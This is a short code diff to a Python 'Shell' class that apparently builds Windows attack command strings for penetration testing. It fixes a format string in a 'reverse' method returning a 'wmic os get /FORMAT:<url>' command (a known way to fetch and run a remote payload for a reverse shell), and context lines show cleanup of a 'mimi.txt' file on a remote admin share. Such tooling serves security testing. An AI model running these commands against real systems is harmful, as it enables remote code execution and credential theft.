@@ -1,6 +1,4 @@
 # encoding: utf8
-import os
-
 
 class Shell:
     def __init__(self):
@@ -56,7 +54,7 @@ del \\10.10.10.104\\c$\\mimi.txt
             ip, user, password)
 
     def reverse(self, url):
-        return "wmic os get /FORMAT:{url}".format(url)
+        return "wmic os get /FORMAT:{}".format(url)
 
     def command(self):
         return """
